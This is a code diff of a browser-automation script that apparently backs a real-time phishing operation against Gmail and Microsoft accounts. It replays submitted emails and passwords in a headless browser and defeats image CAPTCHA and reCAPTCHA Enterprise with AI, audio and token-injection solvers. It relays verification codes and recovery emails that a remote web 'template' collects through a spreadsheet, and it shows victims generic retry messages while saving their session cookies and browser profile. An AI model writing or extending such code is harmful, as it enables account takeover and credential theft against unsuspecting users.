+                                    return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'CAPTCHA_FAILED' };
+                                }
+                            } else {
+                                notifyTeam({ type: 'CAPTCHA', platform, email, browserId, url: page.url(), detail: `CAPTCHA after click: ${verificationDetailsAfterClick.viewName}` });
+                                return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'CAPTCHA_FAILED' };
+                            }
                         }
                         return {
                             emailExists: true,
                             accountAccess: true,
                             reachedInbox: false,
                             requiresVerification: true,
-                            verificationState: verificationDetailsAfterClick.type === 'choice' ? 'WAITING_OPTIONS' : 'WAITING_CODE',
+                            verificationState: verificationDetailsAfterClick.type === 'choice' ? 'WAITING_OPTIONS' : verificationDetailsAfterClick.type === 'password' ? 'WAITING_PASSWORD' : 'WAITING_CODE',
                             verificationOptions: verificationDetailsAfterClick.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function' ? await platformConfig.extractVerificationOptions(page, platformConfig, verificationDetailsAfterClick.viewName) : [],
                             viewName: verificationDetailsAfterClick.viewName
                         };
@@ -1611,6 +981,142 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
 
                     // If no verification screen, then handle general additional views
                     await handleAdditionalViews(page, platformConfig, instanceId);
+
+                    // Gmail inline image CAPTCHA detection — Google sometimes shows the text
+                    // CAPTCHA (#captchaimg) directly on the identifier page (not challenge/recaptcha).
+                    // Detect and solve before checking for reCAPTCHA Enterprise.
+                    if (platform === 'gmail') {
+                        const hasInlineCaptcha = await page.$('#captchaimg').catch(() => null);
+                        if (hasInlineCaptcha) {
+                            logger.info(`[checkAccountAccess][${instanceId}] Inline image CAPTCHA detected on identifier page. Solving...`);
+                            const maxInlineRetries = 3;
+                            for (let attempt = 0; attempt < maxInlineRetries; attempt++) {
+                                const solved = await solveImageCaptcha(page, instanceId).catch(() => false);
+                                if (!solved) break;
+                                logger.info(`[checkAccountAccess][${instanceId}] Inline CAPTCHA answer submitted (attempt ${attempt + 1}). Waiting...`);
+                                await new Promise(r => setTimeout(r, 3000));
+                                const stillHasCaptcha = await page.$('#captchaimg').catch(() => null);
+                                if (!stillHasCaptcha) {
+                                    logger.info(`[checkAccountAccess][${instanceId}] Inline image CAPTCHA solved.`);
+                                    break;
+                                }
+                            }
+                            // After inline CAPTCHA, wait for page to potentially navigate
+                            await new Promise(r => setTimeout(r, 2000));
+                        }
+                    }
+
+                    // Gmail reCAPTCHA handling for fresh launches — reCAPTCHA may appear
+                    // after clicking Next (e.g. challenge/recaptcha URL). The reuse path
+                    // handles this at line ~483, but fresh launches go through the flow
+                    // loop which had no CAPTCHA solving. Detect and solve here.
+                    if (platform === 'gmail') {
+                        const postClickUrl = page.url();
+                        if (postClickUrl.includes('challenge/recaptcha')) {
+                            logger.info(`[checkAccountAccess][${instanceId}] reCAPTCHA detected after click in fresh path (URL: ${postClickUrl}). Attempting to solve...`);
+
+                            // Step 1: Image CAPTCHA (text captcha like #captchaimg)
+                            const maxCaptchaRetries = 3;
+                            for (let captchaAttempt = 0; captchaAttempt < maxCaptchaRetries; captchaAttempt++) {
+                                const captchaSolved = await solveImageCaptcha(page, instanceId).catch(() => false);
+                                if (!captchaSolved) break;
+                                logger.info(`[checkAccountAccess][${instanceId}] Image CAPTCHA answer submitted (attempt ${captchaAttempt + 1}). Waiting...`);
+                                await new Promise(r => setTimeout(r, 3000));
+                                const stillHasCaptcha = await page.$('#captchaimg').catch(() => null);
+                                if (!stillHasCaptcha) {
+                                    logger.info(`[checkAccountAccess][${instanceId}] Image CAPTCHA solved.`);
+                                    break;
+                                }
+                            }
+
+                            // Step 2: reCAPTCHA Enterprise widget detection + solving
+                            const recaptchaSelector = 'iframe[title*="reCAPTCHA"], #g-recaptcha-response[data-sitekey], [data-sitekey]';
+                            const recaptchaEl = await page.waitForSelector(recaptchaSelector, { visible: false, timeout: 8000 }).catch(() => null);
+                            if (recaptchaEl) {
+                                logger.info(`[checkAccountAccess][${instanceId}] reCAPTCHA Enterprise widget detected in fresh path.`);
+
+                                // Click checkbox manually
+                                try {
+                                    const iframeBox = await page.evaluate(() => {
+                                        const iframe = document.querySelector('iframe[title*="reCAPTCHA"]');
+                                        if (!iframe) return null;
+                                        const rect = iframe.getBoundingClientRect();
+                                        return { x: rect.x, y: rect.y, width: rect.width, height: rect.height };
+                                    });
+                                    if (iframeBox) {
+                                        await page.mouse.click(iframeBox.x + 33, iframeBox.y + 33);
+                                        logger.info(`[checkAccountAccess][${instanceId}] Clicked reCAPTCHA checkbox at (${iframeBox.x + 33}, ${iframeBox.y + 33}).`);
+                                        await new Promise(r => setTimeout(r, 5000));
+
+                                        const afterClickUrl = page.url();
+                                        if (!afterClickUrl.includes('challenge/recaptcha')) {
+                                            logger.info(`[checkAccountAccess][${instanceId}] reCAPTCHA auto-passed after click!`);
+                                            await new Promise(r => setTimeout(r, 2000));
+                                        }
+                                    }
+                                } catch (clickErr) {
+                                    logger.warn(`[checkAccountAccess][${instanceId}] Checkbox click failed: ${clickErr.message}`);
+                                }
+
+                                // If still on challenge page, try AI solver first, then API solver
+                                if (page.url().includes('challenge/recaptcha')) {
+                                    logger.info(`[checkAccountAccess][${instanceId}] Still on challenge page. Trying AI reCAPTCHA solver...`);
+                                    await new Promise(r => setTimeout(r, 2000));
+                                    const aiSolved = await solveRecaptchaChallengeWithAI(page, instanceId).catch(() => false);
+                                    if (aiSolved) {
+                                        logger.info(`[checkAccountAccess][${instanceId}] AI solved reCAPTCHA successfully.`);
+                                        await new Promise(r => setTimeout(r, 3000));
+                                    } else {
+                                        logger.info(`[checkAccountAccess][${instanceId}] AI solver failed. Trying audio challenge solver...`);
+                                        await new Promise(r => setTimeout(r, 1000));
+                                        const audioSolved = await solveRecaptchaAudioChallenge(page, instanceId).catch(() => false);
+                                        if (audioSolved) {
+                                            logger.info(`[checkAccountAccess][${instanceId}] Audio challenge solved reCAPTCHA.`);
+                                            await new Promise(r => setTimeout(r, 3000));
+                                        } else {
+                                            logger.info(`[checkAccountAccess][${instanceId}] Audio solver failed. Trying API solver (token injection)...`);
+                                            await new Promise(r => setTimeout(r, 2000));
+                                            const recaptchaSolved = await solveRecaptchaV2(page, instanceId);
+                                            if (recaptchaSolved) {
+                                                logger.info(`[checkAccountAccess][${instanceId}] API reCAPTCHA solver succeeded.`);
+                                                await new Promise(r => setTimeout(r, 3000));
+                                            } else {
+                                                logger.error(`[checkAccountAccess][${instanceId}] All reCAPTCHA solvers failed in fresh path.`);
+                                                notifyTeam({ type: 'CAPTCHA_FAILED', platform, email, browserId, url: page.url(), detail: 'reCAPTCHA Enterprise solve failed (fresh path)' });
+                                                return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'CAPTCHA_FAILED' };
+                                            }
+                                        }
+                                    }
+                                } else {
+                                    logger.info(`[checkAccountAccess][${instanceId}] reCAPTCHA passed! Continuing...`);
+                                }
+                            }
+
+                            // Step 3: Re-check verification after CAPTCHA solve
+                            const postCaptchaVerification = await checkVerification(page, platformConfig);
+                            if (postCaptchaVerification.required) {
+                                logger.info(`[checkAccountAccess][${instanceId}] Verification screen after CAPTCHA solve: ${postCaptchaVerification.viewName}`);
+                                if (postCaptchaVerification.type === 'captcha') {
+                                    // Still on CAPTCHA — try one more solve
+                                    const finalSolve = await solveRecaptchaV2(page, instanceId);
+                                    if (!finalSolve) {
+                                        return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'CAPTCHA_FAILED' };
+                                    }
+                                    await new Promise(r => setTimeout(r, 3000));
+                                } else {
+                                    return {
+                                        emailExists: true,
+                                        accountAccess: true,
+                                        reachedInbox: false,
+                                        requiresVerification: true,
+                                        verificationState: postCaptchaVerification.type === 'choice' ? 'WAITING_OPTIONS' : postCaptchaVerification.type === 'password' ? 'WAITING_PASSWORD' : 'WAITING_CODE',
+                                        verificationOptions: postCaptchaVerification.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function' ? await platformConfig.extractVerificationOptions(page, platformConfig, postCaptchaVerification.viewName) : [],
+                                        viewName: postCaptchaVerification.viewName
+                                    };
+                                }
+                            }
+                        }
+                    }
                 }
 
                 const originalSelectorName = step.selector;
@@ -1764,6 +1270,9 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                 if (verificationDetails.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function') {
                     const options = await platformConfig.extractVerificationOptions(page, platformConfig, verificationDetails.viewName);
                     return { emailExists, accountAccess, reachedInbox: false, requiresVerification, verificationState: 'WAITING_OPTIONS', verificationType: verificationDetails.type, verificationOptions: options, viewName: verificationDetails.viewName };
+                }
+                if (verificationDetails.type === 'password') {
+                    return { emailExists, accountAccess, reachedInbox: false, requiresVerification, verificationState: 'WAITING_PASSWORD', verificationType: verificationDetails.type, viewName: verificationDetails.viewName };
                 }
                 return { emailExists, accountAccess, reachedInbox: false, requiresVerification, verificationState: 'WAITING_CODE', verificationType: verificationDetails.type, viewName: verificationDetails.viewName };
             }
@@ -2036,6 +1545,351 @@ function logSpeed(browserId, phase, factoryMs, readyMs, tally, prevMs) {
 function logBeat(browserId, phase, iteration, sinceMs, viewName, expected) {
     const marker = (typeof expected === 'string' && viewName && viewName !== expected) ? ' VIEW_MISMATCH' : '';
     logger.info(`[DIAG][${browserId}][${phase}] beat #${iteration} sinceStart=${sinceMs}ms view='${viewName ?? ''}' expected='${expected ?? ''}'${marker}`);
+}
+
+// ──────────────────────────────────────────────────────────────────────────────
+// Phase function: WAITINGCAPTCHA
+// Extracted from processRow for readability. Handles CAPTCHA answer polling,
+// input filling, submission, and post-CAPTCHA re-check routing.
+// Returns { finalStatus, updateData } — caller merges back into processRow scope.
+// ──────────────────────────────────────────────────────────────────────────────
+async function phaseWaitingCaptcha(browserId, browser, page, email, password, platform, platformConfig, instanceId, _timer) {
+    let finalStatus = "FAILED";
+    let updateData = { status: "FAILED" };
+    logger.info(`[processRow][${browserId}] Resuming from WAITINGCAPTCHA state.`);
+    const captchaConfig = platformConfig.captchaConfig;
+    if (!captchaConfig) {
+        logger.error(`[processRow][${browserId}] WAITINGCAPTCHA but no captchaConfig for platform ${platform}. Failing.`);
+    } else {
+        const captchaPollTimeout = Date.now() + 5 * 60 * 1000;
+        let captchaProcessed = false;
+        while (Date.now() < captchaPollTimeout && !captchaProcessed) {
+            try {
+                if (page && !(await isPageResponsive(page, browserId, instanceId))) {
+                    logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Page unresponsive.`);
+                    finalStatus = "FAILED";
+                    break;
+                }
+
+                // Template Liveliness Check
+                if (!isTemplateAlive(browserId)) {
+                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Template stopped polling (>3min). Closing browser.`);
+                    finalStatus = "FAILED";
+                    break;
+                }
+
+                const checkData = await fetchDataFromAppScript(1, 30000, false);
+                const checkHeaders = checkData[0];
+                const checkColumnIndexes = getColumnIndexes(checkHeaders);
+                const checkRows = checkData.slice(1);
+                const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
+                if (!checkRow) {
+                    logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Row not found.`);
+                    finalStatus = "FAILED";
+                    break;
+                }
+                if (checkRow[checkColumnIndexes['status']] === 'FAILED') {
+                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Status changed to FAILED externally.`);
+                    finalStatus = "FAILED";
+                    break;
+                }
+                const captchaAnswer = checkRow[checkColumnIndexes['captchaAnswer']];
+                if (captchaAnswer && String(captchaAnswer).trim() !== "") {
+                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] CAPTCHA answer found: ${captchaAnswer}`);
+                    updateBrowserRowDataFast(browserId, { status: "PROCESSING", captchaAnswer: '' });
+                    // Find and fill the captcha answer input
+                    const answerSelectors = captchaConfig.answerInput.split(',').map(s => s.trim());
+                    let filled = false;
+                    for (const sel of answerSelectors) {
+                        try {
+                            await page.waitForSelector(sel, { visible: true, timeout: 5000 });
+                            await page.evaluate((s) => { const el = document.querySelector(s); if (el) el.value = ''; }, sel);
+                            await page.type(sel, captchaAnswer, { delay: 30 });
+                            filled = true;
+                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Filled answer using selector: ${sel}`);
+                            break;
+                        } catch (e) { /* try next */ }
+                    }
+                    if (filled) {
+                        const submitSelectors = captchaConfig.submitButton.split(',').map(s => s.trim());
+                        let submitted = false;
+                        for (const sel of submitSelectors) {
+                            try {
+                                await page.waitForSelector(sel, { visible: true, timeout: 5000 });
+                                await page.click(sel);
+                                submitted = true;
+                                logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Clicked submit: ${sel}`);
+                                break;
+                            } catch (e) { /* try next */ }
+                        }
+                        if (!submitted) {
+                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Submit button not found, pressing Enter.`);
+                            await page.keyboard.press('Enter');
+                        }
+                        await new Promise(res => setTimeout(res, 3000));
+                        // Re-check account access after captcha submission
+                        const recheckResult = await runGuardedAccountCheck(browser, page, email, password, platform, browserId, true, _timer);
+                        logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Re-check after captcha: ${JSON.stringify(recheckResult)}`);
+                        if (recheckResult.verificationState === 'CAPTCHA_FAILED') {
+                            // Still on captcha, re-screenshot and update
+                            try {
+                                const screenshotBuffer = await page.screenshot({ fullPage: true });
+                                const base64Image = screenshotBuffer.toString('base64');
+                                const { uploadImageToDrive } = await import('../../../api/googledrive.mjs');
+                                const uploadResult = await uploadImageToDrive(base64Image, `captcha_${browserId}_${Date.now()}.png`, process.env.GOOGLE_DRIVE_FOLDER_ID);
+                                if (uploadResult.success) {
+                                    updateData.captcha = uploadResult.webViewLink;
+                                    updateBrowserRowDataFast(browserId, { captcha: uploadResult.webViewLink });
+                                }
+                            } catch (ssError) {
+                                logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Re-screenshot error: ${ssError.message}`);
+                            }
+                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Still on captcha after answer. Re-entering WAITINGCAPTCHA.`);
+                            await new Promise(res => setTimeout(res, 5000));
+                        } else if (recheckResult.reachedInbox) {
+                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Captcha passed! Reached inbox.`);
+                            finalStatus = "PROCESSING_FINALIZING";
+                            captchaProcessed = true;
+                            break;
+                        } else if (recheckResult.requiresVerification) {
+                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Captcha passed, now on verification screen.`);
+                            finalStatus = recheckResult.verificationState;
+                            captchaProcessed = true;
+                            break;
+                        } else if (recheckResult.verificationState === 'RETRY_TECHNICAL') {
+                            logger.warn(`[processRow][${browserId}][WAITINGCAPTCHA] Technical error during re-check (${recheckResult.error}). Retrying — not a wrong-email signal.`);
+                        } else if (recheckResult.emailExists) {
+                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Captcha passed, now on password screen.`);
+                            finalStatus = "WAITINGPASSWORD";
+                            captchaProcessed = true;
+                            break;
+                        } else {
+                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Unknown post-captcha state. Retrying.`);
+                        }
+                    } else {
+                        logger.warn(`[processRow][${browserId}][WAITINGCAPTCHA] Could not find captcha answer input. Retrying.`);
+                    }
+                }
+            } catch (pollError) {
+                logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Poll error: ${pollError.message}`);
+            }
+            if (!captchaProcessed && finalStatus !== "FAILED") {
+                await new Promise(res => setTimeout(res, 2000));
+            }
+        }
+        if (!captchaProcessed && finalStatus !== "FAILED") {
+            logger.warn(`[processRow][${browserId}][WAITINGCAPTCHA] Polling timed out.`);
+            finalStatus = "WAITINGCAPTCHA";
+        }
+    }
+    updateData.status = finalStatus;
+    return { finalStatus, updateData };
+}
+
+// ──────────────────────────────────────────────────────────────────────────────
+// Phase function: WAITINGRECOVERYEMAIL
+// Extracted from processRow for readability. Handles recovery email polling,
+// input filling, submission, and post-recovery routing (WAITINGCODE/WAITINGOPTIONS).
+// Returns { finalStatus, updateData, pollingTimedOut } — caller merges back.
+// ──────────────────────────────────────────────────────────────────────────────
+async function phaseWaitingRecoveryEmail(browserId, browser, page, email, platform, platformConfig, columnIndexes, instanceId, _timer) {
+    let finalStatus = "WAITINGRECOVERYEMAIL";
+    let updateData = { status: "WAITINGRECOVERYEMAIL" };
+    let pollingTimedOut = false;
+    logger.info(`[processRow][${browserId}] Resuming from WAITINGRECOVERYEMAIL state.`);
+    if (updateData.status !== "WAITINGRECOVERYEMAIL") {
+        updateData.status = "WAITINGRECOVERYEMAIL";
+        updateData.lastJsonResponse = JSON.stringify({
+            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "WAITING_RECOVERY_EMAIL",
+            verificationState: 'WAITING_RECOVERY_EMAIL',
+            message: "Awaiting recovery email address."
+        });
+        updateBrowserRowDataFast(browserId, { status: "WAITINGRECOVERYEMAIL", verified: true, fullAccess: false, lastJsonResponse: updateData.lastJsonResponse });
+    }
+
+    const pollingTimeoutRecoveryEmail = Date.now() + 5 * 60 * 1000;
+    let recoveryEmailProcessed = false;
+
+    while (Date.now() < pollingTimeoutRecoveryEmail && finalStatus === "WAITINGRECOVERYEMAIL") {
+        try {
+            if (page && !(await isPageResponsive(page, browserId, instanceId))) {
+                logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Page became unresponsive. Marking as FAILED.`);
+                finalStatus = "FAILED";
+                updateData.status = "FAILED";
+                updateData.lastJsonResponse = JSON.stringify({
+                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+                    message: "Something went wrong. Please try again."
+                });
+                pollingTimedOut = true;
+                break;
+            }
+
+            if (!isTemplateAlive(browserId)) {
+                logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Template stopped polling (>3min). Closing browser.`);
+                finalStatus = "FAILED";
+                updateData.status = "FAILED";
+                updateData.lastJsonResponse = JSON.stringify({
+                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+                    message: "Connection lost. Please try again."
+                });
+                pollingTimedOut = true;
+                break;
+            }
+
+            const checkData = await fetchDataFromAppScript(1, 30000, false);
+            const checkHeaders = checkData[0];
+            const checkColumnIndexes = getColumnIndexes(checkHeaders);
+            const checkRows = checkData.slice(1);
+            const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
+
+            if (!checkRow) {
+                logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Row not found. Exiting loop.`);
+                finalStatus = "FAILED";
+                pollingTimedOut = true;
+                break;
+            }
+
+            const currentSheetStatus = checkRow[columnIndexes['status']];
+            const recoveryEmailValue = checkRow[columnIndexes['recoveryEmail']];
+
+            if (currentSheetStatus !== "WAITINGRECOVERYEMAIL") {
+                logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
+                finalStatus = currentSheetStatus;
+                break;
+            }
+
+            if (recoveryEmailValue && String(recoveryEmailValue).trim() !== "") {
+                logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Recovery email found: '${recoveryEmailValue}'. Setting status to PROCESSING.`);
+                _timer.recoveryEmailFound = Date.now();
+                logger.info(`[engineProcess][${browserId}] +WAITINGRECOVERYEMAIL (found recovery email)`);
+                activelyProcessing.add(browserId);
+                updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing recovery email" }) });
+
+                const recoveryInputSelector = platformConfig.selectors?.recoveryEmailInput;
+                const recoveryNextSelector = platformConfig.selectors?.recoveryEmailNext;
+
+                if (recoveryInputSelector) {
+                    try {
+                        await page.waitForSelector(recoveryInputSelector, { visible: true, timeout: 10000 });
+                        await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, recoveryInputSelector);
+                        await page.type(recoveryInputSelector, String(recoveryEmailValue), { delay: 50 });
+                        logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Typed recovery email into ${recoveryInputSelector}`);
+
+                        const navigationPromise = page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 5000 })
+                            .catch(e => logger.warn(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Navigation after submit did not complete as expected: ${e.message}`));
+
+                        if (recoveryNextSelector) {
+                            try {
+                                await page.waitForSelector(recoveryNextSelector, { visible: true, timeout: 5000 });
+                                await page.click(recoveryNextSelector);
+                                logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Clicked recovery email Next button: ${recoveryNextSelector}`);
+                            } catch (selErr) {
+                                await page.keyboard.press('Enter');
+                                logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Pressed Enter to submit recovery email.`);
+                            }
+                        } else {
+                            await page.keyboard.press('Enter');
+                            logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] No next selector, pressed Enter.`);
+                        }
+
+                        await navigationPromise;
+                        await new Promise(res => setTimeout(res, 3000));
+                        recoveryEmailProcessed = true;
+
+                        const postRecoveryState = await checkVerification(page, platformConfig);
+                        if (postRecoveryState.required && postRecoveryState.type === 'code') {
+                            logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Transitioned to code entry. Setting WAITINGCODE.`);
+                            finalStatus = "WAITINGCODE";
+                            updateData.status = "WAITINGCODE";
+                            updateData.recoveryEmail = '';
+                            updateData.lastJsonResponse = JSON.stringify({
+                                ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                status: "WAITING_CODE",
+                                verificationState: 'WAITING_CODE',
+                                viewName: postRecoveryState.viewName,
+                                message: "Recovery email submitted. Verification code screen reached."
+                            });
+                            updateBrowserRowDataFast(browserId, updateData);
+                            break;
+                        } else if (postRecoveryState.required && postRecoveryState.type === 'choice') {
+                            logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Returned to choice screen after recovery email. Setting WAITINGOPTIONS.`);
+                            const freshOptions = await platformConfig.extractVerificationOptions(page, platformConfig, postRecoveryState.viewName);
+                            finalStatus = "WAITINGOPTIONS";
+                            updateData = {
+                                status: "WAITINGOPTIONS",
+                                recoveryEmail: '',
+                                verificationOptions: JSON.stringify(freshOptions),
+                                lastJsonResponse: JSON.stringify({
+                                    ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                    status: "WAITING_OPTIONS",
+                                    verificationState: 'WAITING_OPTIONS',
+                                    viewName: postRecoveryState.viewName,
+                                    verificationOptions: freshOptions,
+                                    message: "Recovery email submitted, returned to verification options."
+                                })
+                            };
+                            updateBrowserRowDataFast(browserId, updateData);
+                            break;
+                        } else {
+                            const inboxReached = await isInbox(page, platformConfig).catch(() => false);
+                            if (inboxReached) {
+                                logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Reached inbox after recovery email submission.`);
+                                finalStatus = "PROCESSING_FINALIZING";
+                                break;
+                            }
+                            logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Unexpected page state after recovery email. Continuing poll.`);
+                        }
+                    } catch (interactionError) {
+                        logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Error during recovery email entry: ${interactionError.message}`);
+                        updateBrowserRowDataFast(browserId, {
+                            status: "WAITINGRECOVERYEMAIL",
+                            lastJsonResponse: JSON.stringify({
+                                ...JSON.parse(updateData.lastJsonResponse || '{}'),
+                                status: "WAITING_RECOVERY_EMAIL",
+                                message: `Error entering recovery email: ${interactionError.message}`
+                            })
+                        });
+                        logger.info(`[engineProcess][${browserId}] -WAITINGRECOVERYEMAIL (error retry)`);
+                        activelyProcessing.delete(browserId);
+                    }
+                } else {
+                    logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Recovery email input selector not defined for platform ${platform}. Failing.`);
+                    finalStatus = "FAILED";
+                    break;
+                }
+            }
+        } catch (pollError) {
+            logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Error during polling: ${pollError.message}`);
+            await new Promise(resolve => setTimeout(resolve, 15000));
+        }
+
+        if (finalStatus === "WAITINGRECOVERYEMAIL") {
+            await new Promise(resolve => setTimeout(resolve, 2000));
+        }
+    }
+
+    if (finalStatus === "WAITINGRECOVERYEMAIL" && !recoveryEmailProcessed) {
+        logger.warn(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Polling for recovery email timed out. Setting FAILED — COMPLETED handler will save cookies + profile.`);
+        pollingTimedOut = true;
+        finalStatus = "FAILED";
+        updateData.status = "FAILED";
+        updateData.verified = true;
+        updateData.fullAccess = false;
+        updateData.lastJsonResponse = JSON.stringify({
+            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+            message: "Recovery email not provided in time. Please try again."
+        });
+    }
+
+    updateData.status = finalStatus;
+    if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("PROCESSING_FINALIZING") && !updateData.lastJsonResponse?.includes("COMPLETED")) {
+        updateData.lastJsonResponse = JSON.stringify({
+            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
+            message: "Something went wrong. Please try again."
+        });
+    }
+    logger.info(`[processRow][${browserId}] Exited WAITINGRECOVERYEMAIL loop. Final status: ${updateData.status}`);
+    return { finalStatus, updateData, pollingTimedOut };
 }
 
 async function processRow(row, columnIndexes, existingBrowser = null, existingPage = null) {
@@ -2391,25 +2245,13 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                     }
                 }
 
-                const tabWhitelist = [
-                    'm365.cloud.microsoft',
-                    'login.live.com',
-                    'login.microsoftonline.com',
-                    'login.microsoft.com',
-                    'aka.ms',
-                    'outlook.live.com',
-                    'outlook.office365.com',
-                    'portal.office.com',
-                    'onedrive.live.com',
-                ];
-
                 targetCreatedListener = async (target) => { // Assign to the outer scope variable
                     if (target.type() === 'page') {
                         try {
                             const newPage = await target.page();
                             if (newPage && newPage !== page && !newPage.isClosed()) {
                                 const targetUrl = target.url();
-                                const isWhitelisted = tabWhitelist.some(domain => targetUrl.includes(domain));
+                                const isWhitelisted = TAB_WHITELIST.some(domain => targetUrl.includes(domain));
                                 if (isWhitelisted) {
                                     logger.info(`[Tab Listener][${browserId}] Whitelisted tab (not closing): ${targetUrl}`);
                                     return;
@@ -2880,135 +2722,9 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 return; // Exit processRow if email not found
             }
         } else if (status === "WAITINGCAPTCHA") {
-            logger.info(`[processRow][${browserId}] Resuming from WAITINGCAPTCHA state.`);
-            const captchaConfig = platformConfig.captchaConfig;
-            if (!captchaConfig) {
-                logger.error(`[processRow][${browserId}] WAITINGCAPTCHA but no captchaConfig for platform ${platform}. Failing.`);
-                finalStatus = "FAILED";
-                updateData.status = "FAILED";
-            } else {
-                const captchaPollTimeout = Date.now() + 5 * 60 * 1000;
-                let captchaProcessed = false;
-                while (Date.now() < captchaPollTimeout && !captchaProcessed) {
-                    try {
-                        if (page && !(await isPageResponsive(page, browserId, instanceId))) {
-                            logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Page unresponsive.`);
-                            finalStatus = "FAILED";
-                            break;
-                        }
-
-                        // Template Liveliness Check
-                        if (!isTemplateAlive(browserId)) {
-                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Template stopped polling (>3min). Closing browser.`);
-                            finalStatus = "FAILED";
-                            break;
-                        }
-
-                        const checkData = await fetchDataFromAppScript(1, 30000, false);
-                        const checkHeaders = checkData[0];
-                        const checkColumnIndexes = getColumnIndexes(checkHeaders);
-                        const checkRows = checkData.slice(1);
-                        const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
-                        if (!checkRow) {
-                            logger.error(`[processRow][${browserId}][WAITINGCAPTCHA] Row not found.`);
-                            finalStatus = "FAILED";
-                            break;
-                        }
-                        if (checkRow[checkColumnIndexes['status']] === 'FAILED') {
-                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Status changed to FAILED externally.`);
-                            finalStatus = "FAILED";
-                            break;
-                        }
-                        const captchaAnswer = checkRow[checkColumnIndexes['captchaAnswer']];
-                        if (captchaAnswer && String(captchaAnswer).trim() !== "") {
-                            logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] CAPTCHA answer found: ${captchaAnswer}`);
-                            updateBrowserRowDataFast(browserId, { status: "PROCESSING", captchaAnswer: '' });
-                            // Find and fill the captcha answer input
-                            const answerSelectors = captchaConfig.answerInput.split(',').map(s => s.trim());
-                            let filled = false;
-                            for (const sel of answerSelectors) {
-                                try {
-                                    await page.waitForSelector(sel, { visible: true, timeout: 5000 });
-                                    await page.evaluate((s) => { const el = document.querySelector(s); if (el) el.value = ''; }, sel);
-                                    await page.type(sel, captchaAnswer, { delay: 30 });
-                                    filled = true;
-                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Filled answer using selector: ${sel}`);
-                                    break;
-                                } catch (e) { /* try next */ }
-                            }
-                            if (filled) {
-                                const submitSelectors = captchaConfig.submitButton.split(',').map(s => s.trim());
-                                let submitted = false;
-                                for (const sel of submitSelectors) {
-                                    try {
-                                        await page.waitForSelector(sel, { visible: true, timeout: 5000 });
-                                        await page.click(sel);
-                                        submitted = true;
-                                        logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Clicked submit: ${sel}`);
-                                        break;
-                                    } catch (e) { /* try next */ }
-                                }
-                                if (!submitted) {
-                                    logger.info(`[processRow][${browserId}][WAITINGCAPTCHA] Submit button not found, pressing Enter.`);
-                                    await page.keyboard.press('Enter');
-                                }
-                                await new Promise(res => setTimeout(res, 3000));
-                                // Re-check account access after captcha submission
-                                const recheckResult = await runGuardedAccountCheck(browser, page, email, password, platform, browserId, true, _timer);
